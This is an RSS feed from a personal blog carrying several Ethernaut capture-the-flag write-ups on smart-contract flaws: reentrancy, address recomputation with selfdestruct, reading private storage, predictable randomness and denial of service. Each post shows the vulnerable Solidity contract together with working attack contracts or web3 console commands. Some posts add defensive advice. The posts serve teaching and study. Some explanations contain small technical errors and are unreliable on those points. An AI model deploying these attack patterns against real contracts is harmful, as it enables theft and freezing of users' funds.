<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blockchain_WriteUps on DimitrisV SV1SJP</title><link>/blockchain_writeups/</link><description>Recent content in Blockchain_WriteUps on DimitrisV SV1SJP</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>TuxHouse - Dimitris LinuxOS - 2011-2023</copyright><lastBuildDate>Tue, 01 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="/blockchain_writeups/index.xml" rel="self" type="application/rss+xml"/><item><title>Reeintrancy - Ethernaut</title><link>/blockchain_writeups/reeinctancy/</link><pubDate>Tue, 01 Feb 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/reeinctancy/</guid><description>On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack. So we have this smart-contract and we have to withdraw all of it&amp;rsquo;s ether:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Reentrance { using SafeMath for uint256; mapping(address =&amp;gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].</description><content>&lt;p>On this challenge, we will learn how the infamous DAO occured and how to prevent such an incident to occur again. Ethereum splitted into two Blockchains, Ethereum and Ethereum Classic because of a DAO Attack.
So we have this smart-contract and we have to withdraw all of it&amp;rsquo;s ether:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract Reentrance {
using SafeMath for uint256;
mapping(address =&amp;gt; uint) public balances;
function donate(address _to) public payable {
balances[_to] = balances[_to].add(msg.value);
}
function balanceOf(address _who) public view returns (uint balance) {
return balances[_who];
}
function withdraw(uint _amount) public {
if(balances[msg.sender] &amp;gt;= _amount) {
(bool result,) = msg.sender.call{value:_amount}(&amp;#34;&amp;#34;);
if(result) {
_amount;
}
balances[msg.sender] -= _amount;
}
}
receive() external payable {}
}
&lt;/code>&lt;/pre>&lt;p>Re-entrancy happens in single-thread computing environments, when the execution stack jumps or calls subroutines, before returning to the original execution.
Firstly, we create a smart-contract called ReentranceAttack.sol with which we are going to attack the main smart-contract shown above:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;
import &amp;#39;./Reentrance.sol&amp;#39;;
contract ReentranceAttack {
Reentrance target;
uint public amount = 1 ether;
constructor(address payable _targetAddr) public payable {
target= Reentrance(_targetAddr);
}
function donateToTarget() public {
target.donate.value(amount).gas(4000000)(address(this)); }
fallback() external payable {
if (address(target).balance !=0){
target.withdraw(amount);
}
}
}
&lt;/code>&lt;/pre>&lt;p>We need to take into account these two criterias:&lt;/p>
&lt;ul>
&lt;li>Fallback functions can be called by anyone and execute malicious code.&lt;/li>
&lt;li>Malicious external contracts can abuse withdrawals.&lt;/li>
&lt;/ul>
&lt;p>The expoitation was done by following these steps:&lt;/p>
&lt;ul>
&lt;li>We deploy ReentranceAttack.sol with a value of 1 ether and as an address parameter we input the Reentrance.sol address which we find from the console by typing &amp;ldquo;contract.address&amp;rdquo;.&lt;/li>
&lt;li>We donate 1 ether to the Reentrance.sol by calling the function donateToTarget() from the ReentranceAttack.sol in order to add ReentranceAttack.sol address into balances.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mapping(address =&amp;gt; uint) public balances;
&lt;/code>&lt;/pre>&lt;p>Now that we are into balances, we satisfy the requirement of withdraw() function.&lt;/p>
&lt;ul>
&lt;li>By using the Remix IDE, we trigger the fallback() function from the ReentranceAttack.sol which calls the withdraw() function from the Reentrance.sol. Now the withdraw() function is called and we satisfy the requirement of it, it will call back the fallback() function of the ReentranceAttack.sol and this loop will continue until the balance of the Reentrance.sol is zero.&lt;/li>
&lt;li>&lt;/li>
&lt;/ul>
&lt;p>There are multiple ways to protect your smart-contract in order to prevent issues like DAO Attack to happen.&lt;/p>
&lt;ul>
&lt;li>The order of execution really matters in programming, specially in Solidity. If we have to take external function calls, making the call must be the last thing to do. Even better,if we can invoke transfer in a separate function.&lt;/li>
&lt;li>Include a mutex to prevent re-entrancy. For example we can create a Boolean lock variable or a binary variable to signal execution depth.&lt;/li>
&lt;li>When we have to use function modifiers to check invariants, we should be extremely careful as modifiers are executed at the start of the function.&lt;/li>
&lt;li>Use transfer to move funds out of a smart-contract, as low level functions like call and send just return false but don&amp;rsquo;t interrupt the execution flow when receiving contract fails.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Recovery - Ethernaut</title><link>/blockchain_writeups/recovery/</link><pubDate>Sun, 30 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/recovery/</guid><description>On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether. At first, we check the code:
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.</description><content>&lt;p>On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether.
At first, we check the code:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract Recovery {
//generate tokens
function generateToken(string memory _name, uint256 _initialSupply) public {
new SimpleToken(_name, msg.sender, _initialSupply);
}
}
contract SimpleToken {
using SafeMath for uint256;
// public variables
string public name;
mapping (address =&amp;gt; uint) public balances;
// constructor
constructor(string memory _name, address _creator, uint256 _initialSupply) public {
name = _name;
balances[_creator] = _initialSupply;
}
// collect ether in return for tokens
receive() external payable {
balances[msg.sender] = msg.value.mul(10);
}
// allow transfers of tokens
function transfer(address _to, uint _amount) public {
require(balances[msg.sender] &amp;gt;= _amount);
balances[msg.sender] = balances[msg.sender].sub(_amount);
balances[_to] = _amount;
}
// clean up after ourselves
function destroy(address payable _to) public {
selfdestruct(_to);
}
}
&lt;/code>&lt;/pre>&lt;p>We can see that this smart contract has a destroy function with a selfdestruct() operator on it. However, the function destroy is not public payable. That means we can&amp;rsquo;t simply make a transaction and call it. We should find the address and then call it by using the contract&amp;rsquo;s address. We know that contract addresses are deterministically calculated. From Ethereum&amp;rsquo;s yellow paper we can read: &amp;ldquo;The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce. Thus we define the resultant address for the new account&amp;rdquo;.
We can represent this function as:&lt;/p>
&lt;pre tabindex="0">&lt;code>address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
&lt;/code>&lt;/pre>&lt;p>On which:&lt;/p>
&lt;ul>
&lt;li>&amp;ldquo;sender address&amp;rdquo; is the contract or wallet address that created this new contract. So, we can type in console &amp;ldquo;contract.address&amp;rdquo; and find it easily.&lt;/li>
&lt;li>&amp;ldquo;nonce&amp;rdquo; is the number of the transactions sent from the &amp;ldquo;sender address&amp;rdquo; or if the sender an another smart-contract, the &amp;ldquo;nonce&amp;rdquo; is the number of contract-creations made by this account.&lt;/li>
&lt;li>&amp;ldquo;RLP&amp;rdquo; is an encoder on data structure and is the default to serialize objects in Ethereum. The RLP encoding of a 20-byte address is 0xd6,0x94. Moreover, for all intenger less than 0x7f, its encoding its just its own byte value. As result, the RLP of 1 is 0x01. We keep that in mind for the next step.&lt;/li>
&lt;li>&amp;ldquo;keccak&amp;rdquo; is the cryptographic primitive that compute the Ethereum SHA3 hash on any input. Is also refered as Keccak-256.&lt;/li>
&lt;/ul>
&lt;p>So now we can recalculate the address of the new contract by an existing contract located at the contract.address. It should be mentioned that the nonce 0 is always the event of smart contract&amp;rsquo;s creation. So, we will begin to counting from 1. We know that RLP of 1 is 0x01, so by using the web3 utils, we will try to use the function we described above:&lt;/p>
&lt;pre tabindex="0">&lt;code>web3.utils.soliditySha3(&amp;#34;0xd6&amp;#34;, &amp;#34;0x94&amp;#34;, &amp;#34;0xEa90EAAAB78241373b94C98a788524582DA2e593&amp;#34; , &amp;#34;0x01&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>This will return this hexademical:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-'0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331'" data-lang="'0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331'">&lt;/code>&lt;/pre>&lt;p>We will keep only the last 40 characters :&lt;/p>
&lt;pre tabindex="0">&lt;code>16a095b1578566ec7fd216246a8c0a6322f67331
&lt;/code>&lt;/pre>&lt;p>Then we have the smart contract address. Now we can check in Etherscan.io this address and we can find out that it has 0.01 ether inside. As we have the address now we can try to call the destruct function. Therefore, we will encode a function call from console:&lt;/p>
&lt;pre tabindex="0">&lt;code>data = web3.eth.abi.encodeFunctionCall({
name: &amp;#39;destroy&amp;#39; ,
type: &amp;#39;function&amp;#39;,
inputs: [{
type: &amp;#39;address&amp;#39;,
name: &amp;#39;_to&amp;#39; }]
}, [player]);
&lt;/code>&lt;/pre>&lt;p>And then we will create a transaction having our own player address in order to be sent to us the smart&amp;rsquo;s contract ether when we trigger selfdestruct() operation:&lt;/p>
&lt;pre tabindex="0">&lt;code>await web3.eth.sendTransaction({
to: &amp;#34;0x16a095B1578566ec7fd216246A8C0A6322F67331&amp;#34;,
from: player,
data: data } )
&lt;/code>&lt;/pre>&lt;p>We pay the transaction fees and now we transfer all of the contract&amp;rsquo;s ether to our wallet.
From this challenge, we learnt that we can send Ethers to a deterministic address, when the contract does not exist, at least for now.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Privacy - Ethernaut</title><link>/blockchain_writeups/privacy/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/privacy/</guid><description>On this challenge, we have to unlock a vault again, but this is a more advanced one.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Privacy { bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; constructor(bytes32[3] memory _data) public { data = _data; } function unlock(bytes16 _key) public { require(_key == bytes16(data[2])); locked = false; } /* A bunch of super advanced solidity algorithms.</description><content>&lt;p>On this challenge, we have to unlock a vault again, but this is a more advanced one.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Privacy {
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
constructor(bytes32[3] memory _data) public {
data = _data;
}
function unlock(bytes16 _key) public {
require(_key == bytes16(data[2]));
locked = false;
}
/*
A bunch of super advanced solidity algorithms...
,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`
.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,
*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^ ,---/V\
`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*. ~|__(o.o)
^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39; UU UU
*/
}
&lt;/code>&lt;/pre>&lt;p>So we can see some state variables and one byte32array. Our constructor parses the valuable data to the private data. The unlock function is our only point of interaction with this contract and here we just need to pass the right sequence of bytes16 to unlock the contract. As we already know, Ethereum blockchain is public, so we can spy on its storage by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>let storage = []
let callbackFNConstructor = (index) =&amp;gt; (error, contractData) =&amp;gt; {
storage[index]= contractData
}
for( var i = 0; i&amp;lt;6; i++) { web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i)) }
&lt;/code>&lt;/pre>&lt;p>Running the code in the web console above will fetch us the first 6 storage variables defined in the target contract.Then, by accessing in storage array, we can see the 6 storage varaibles:&lt;/p>
&lt;pre tabindex="0">&lt;code>storage
(6) [&amp;#39;0x0000000000000000000000000000000000000000000000000000000000000001&amp;#39;, &amp;#39;0x0000000000000000000000000000000000000000000000000000000061e8582a&amp;#39;, &amp;#39;0x00000000000000000000000000000000000000000000000000000000582aff0a&amp;#39;, &amp;#39;0x6afa09c95f78aa0d4427b26b649a9e39764fb2e42aa80a1628d0af9465f2dfc6&amp;#39;, &amp;#39;0x5be1ffbd26ef932af6988e85bfa3168a66be9f53ad7a4036c81ec5578a9e12a6&amp;#39;, &amp;#39;0x3cb5971a348f1a4224f2175e48a929cc30b29ff44f5886d651e48fce1acdab53&amp;#39;]
&lt;/code>&lt;/pre>&lt;p>The very first storage variable ends with &amp;ldquo;001&amp;rdquo;, so we expect to be a boolean variable. locked is the only boolean variable and obviously it is the first storage array data. We have the variable flattening = 10; and denomination=255. In hexadecimal, 10 is represented as 0a and 255 is represented as 255. We can find these in the third storage data.Due to storage optimization from Ethereum, we can find the in the same variable.&lt;/p>
&lt;p>Storage optimization follows these very simple rules:&lt;/p>
&lt;ol>
&lt;li>Each index set aside for a storage variable allow 256bits.&lt;/li>
&lt;li>Variables are indexed in the order they are defined in smart-contract.&lt;/li>
&lt;li>If a variable consumes less than 256bits to be represented, leftover space will be shared with subsequent variables if they fit. Otherwise, they will be in the next storage variable.&lt;/li>
&lt;/ol>
&lt;p>Also, it should be mentioned that constants do not use this type of storage. All other storage variables are from the byte32 array &lt;code>data&lt;/code> . Therefore, we can see in unlock function that it is required that the key to be a byte16 and then compares it typecasts the data array[2] as a byte16 to aceed the comparision.
We have just to take the first half of the bytes32 data and that’s going to be the new bytes16 type data. Calling the unlock method with that as an input parameter should unlock the vault. Let&amp;rsquo;s create an attack contract.&lt;/p>
&lt;pre tabindex="0">&lt;code>pragma solidity ^0.6.0;
import &amp;#39;./Privacy.sol&amp;#39;;
contract PrivacyAttack {
Privacy target;
constructor(address _targetAddr) public {
target = Privacy(_targetAddr);
}
function unlock(bytes32 _slotValue) public {
// type casting the bytes32 to bytes16
bytes16 key = bytes16(_slotValue);
target.unlock(key);
}
}
&lt;/code>&lt;/pre>&lt;p>Our contract address is:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.address
&lt;/code>&lt;/pre>&lt;p>Under the deployment of the contract, we add the contract&amp;rsquo;s address to set it as a target in the counstructor. Finally, we can copy the storage data that stores the key and then give it as an input to our attack unlock function. Then, the contract will typecast the data from byte32 to byte16, it will keep only the first half of the bytes32 and send it to bytes16 type data. We unlocked the vault!!&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>CoinFlip - Ethernaut</title><link>/blockchain_writeups/coinflip/</link><pubDate>Sat, 15 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/coinflip/</guid><description>Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.</description><content>&lt;p>Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract CoinFlip {
using SafeMath for uint256;
uint256 public consecutiveWins;
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
constructor() public {
consecutiveWins = 0;
}
function flip(bool _guess) public returns (bool) {
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
if (lastHash == blockValue) {
revert();
}
lastHash = blockValue;
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
if (side == _guess) {
consecutiveWins++;
return true;
} else {
consecutiveWins = 0;
return false;
}
}
}
&lt;/code>&lt;/pre>&lt;p>Computers are unable to generate true random numbers. Computers are combining different things in order to create numbers that people can&amp;rsquo;t predict easily. But, if we repeat the process that computer followed to generate the random number, we will end up with that number. Ethereum is not providing any function for random numbers. As a result, programmers have to create their own functions for randomness or to use Oracles to import random numbers outside the Ethereum Network . As the Coin-Flip game smart-contract needed randomness, the programmer imported the Safemath library to protect it from underflows and it used a long uint256 number in the FACTOR variable.&lt;/p>
&lt;p>In terms of Libraries, libraries are restricted in following ways:&lt;/p>
&lt;ul>
&lt;li>They cannot have state variables.&lt;/li>
&lt;li>They cannot inherit nor be inherited.&lt;/li>
&lt;li>They cannot receive Ether.&lt;/li>
&lt;li>They cannot be destroyed.&lt;/li>
&lt;/ul>
&lt;p>So, we have the public function flip on the smart-contract CoinFlip. We can see they call the blockchash in order to create a hash of one of the given blocks. From Solidity&amp;rsquo;s documentation, we know that blockhash can only work for the 256 most recent blocks. On account of that, in the variable blockValue, we store the blockhash of the current block number, and then they divide by the long number which is stored in variable &amp;ldquo;FACTOR&amp;rdquo;.
Then, it returns a Boolean result. So as we know the process of creation of the random number, what if we try to repeat the process of constructing this &amp;ldquo;random&amp;rdquo; number in our malicious smart-contract and then send the pseudo-anonymous result as our &amp;ldquo;guess&amp;rdquo;?&lt;/p>
&lt;pre tabindex="0">&lt;code> // SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
//import the original smart-contact
import &amp;#34;./CoinFlip.sol&amp;#34;;
contract CoinFlipAttack {
CoinFlip public victimContract;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
constructor(address _victimContractAddr) public {
victimContract= CoinFlip(_victimContractAddr);
}
//reproduce the function flip, but for the previous block, as the last block has been mined.
function flip() public returns (bool) {
uint256 blockValue = uint256(blockhash(block.number-1));
uint256 coinFlip= uint256(blockValue/FACTOR);
bool side = coinFlip == 1 ? true: false;
victimContract.flip(side);
}
}
&lt;/code>&lt;/pre>&lt;p>In our own smart-contract, we reproduced the function flip but we modified the blockhash function to use the previous block as an input, as block has already been mined. Now we are ready to compile and deploy our malicious smart-contract which is ready to fool the original smart-contract. All we have to do is just to spam our cheat function 10 times, until we reach 10 consecutive wins.
However, as we can understand now, there is an another vulnerability here. As miners build them up with different transactions and they compete between themselves to commit their block to Ethereum&amp;rsquo;s Blockchain, miners are able to exercise their judgement when building up blocks. A miner with the appropriate time, could try many different guesses and not commit blocks where he was mistaken. This one of the consequences of Proof Of Work based consensus mechanism, in the process of achieving a really random number.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Vault - Ethernaut</title><link>/blockchain_writeups/vault/</link><pubDate>Sat, 08 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/vault/</guid><description>On this challenge, we have to unlock the vault to win the challenge.
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } First of all, we can see that we have 2 state variables. One of them is the locked variable which is public.</description><content>&lt;p>On this challenge, we have to unlock the vault to win the challenge.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
contract Vault {
bool public locked;
bytes32 private password;
constructor(bytes32 _password) public {
locked = true;
password = _password;
}
function unlock(bytes32 _password) public {
if (password == _password) {
locked = false;
}
}
}
&lt;/code>&lt;/pre>&lt;p>First of all, we can see that we have 2 state variables. One of them is the locked variable which is public. That means that we can very easily see what it is inside the variable by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.locked()
&lt;/code>&lt;/pre>&lt;p>Also, we have the private variable password. Using the console, we cannot just see what it is inside just easily. Therefore, we have 2 options to try in order to solve the problem.&lt;/p>
&lt;ul>
&lt;li>By brute forcing the password, until we find the right one and then unlock the vault. It&amp;rsquo;s possible to happen, but there is a much easier way to achieve this.&lt;/li>
&lt;li>Somehow, to dump the password from the storage of the contract.&lt;/li>
&lt;/ul>
&lt;p>As we have already mentioned earlier, Ethereum is a public Blockchain. That means that everyone can see what exists inside of it. We know that password variable is uint private. In Ethereum from the Solidity Docs, we know that a private type access mean that a variable can be called only from the same smart-contract, not externally by using an another smart-contract or by calling contract.password() from console. As Ethereum is a public ledger, we can just query the smart-contract from it&amp;rsquo;s storage.
Web3.js can help us achieving this, by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>var pwd // to create a variable
web3.eth.getStorageAt(contract.address, 1, function(err, result){pwd = result})
&lt;/code>&lt;/pre>&lt;p>This command will return :&lt;/p>
&lt;pre tabindex="0">&lt;code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29
&lt;/code>&lt;/pre>&lt;p>That is the password in hexadecimal mode. We can very easily convert this hexadecimal in Ascii from our console by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>web3.utils.toAscii(pwd)
&lt;/code>&lt;/pre>&lt;p>And this will return us:&lt;/p>
&lt;pre tabindex="0">&lt;code>A very strong secret password :)
&lt;/code>&lt;/pre>&lt;p>As we have the hexadecimal version of the password, we can simply create a transaction in the function unlock and the hexadecimal value as an input by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.unlock(&amp;#34;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>Now if we check the Boolean variable locked by typing &amp;ldquo;contract.locked()&amp;rdquo; we can see that it is unlocked. We pwned it.
To sum up, we should never insert data unencrypted in Blockchain networks, especially in public Blockchains, as everyone can see what it is inside.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/li>
&lt;li>&lt;/li>
&lt;li>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>King - Ethernaut</title><link>/blockchain_writeups/king/</link><pubDate>Fri, 07 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/king/</guid><description>We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme. Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.</description><content>&lt;p>We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme.
Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract King {
address payable king;
uint public prize;
address payable public owner;
constructor() public payable {
owner = msg.sender;
king = msg.sender;
prize = msg.value;
}
receive() external payable {
require(msg.value &amp;gt;= prize || msg.sender == owner);
king.transfer(msg.value);
king = msg.sender;
prize = msg.value;
}
function _king() public view returns (address payable) {
return king;
}
}
&lt;/code>&lt;/pre>&lt;p>It should be mentioned here that when we will try to submit King.sol instance back to level, Ethernaut will call the fallback function to regain Kingship. As we can understand, we have to find a way to guarantee that all Ethernaut&amp;rsquo;s transactions will fail, so we can remain as a King. Let&amp;rsquo;s check the code into fallback function:&lt;/p>
&lt;pre tabindex="0">&lt;code>receive() external payable {
require(msg.value &amp;gt;= prize || msg.sender == owner);
king.transfer(msg.value);
king = msg.sender;
prize = msg.value;
}
&lt;/code>&lt;/pre>&lt;p>The fallback is an external payable and has as a requirement to be called that the sender sends a higher amount of ether than it is the current price and the msg.sender to be the owner. Then, all of the sended ether is transfered to king and we become the king and our value of ether is sets us the current prize. They key here is the &amp;ldquo;king.transfer()&amp;rdquo; method which can fail if the current king is a malicious contract and refuses to withdraw.
There are multiple ways for transactions to fail, but most of the time we have these 3 options:&lt;/p>
&lt;ul>
&lt;li>Out Of Gas Errors: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails the transaction or over-consumes the gas limit. However cannot make the internal call here as there is not really something we can control.&lt;/li>
&lt;li>Arbitrary Error from FallBack Function. If our transaction ends up executing code from a contract that can always fail.&lt;/li>
&lt;li>Transact with Contract with no fallback function or a non payable fallback function. When a transaction is made towards a contract address without including any data the fallback function of that contract is called. If a contract does not have a fallback function, it will fail. Also, It will fall if we send some ether in a transaction without a payable modifier in the fallback.&lt;/li>
&lt;li>So, we can create a contract with a function that will send ether to the original contract, however without a fallback function so that the king contract cannot send money back.
We create and deploy a malicious smart contract with at least 1 Ether on it.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
contract KingAttack {
function doYourThing(address _target) public payable {
(bool result,) = _target.call{value:msg.value}(&amp;#34;&amp;#34;);
if(!result) revert(&amp;#34;MyBad&amp;#34;);
}
}
&lt;/code>&lt;/pre>&lt;p>This script has a payable function which will send an ether to the contract. As the original smart contract has a payable external fallback function, but it has requirements in order to be executed, it will fail as it will can&amp;rsquo;t handle the 1 ether that we sent it from the attacking contract. As a result, we will become the king forever.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/li>
&lt;/ul>
&lt;ul>
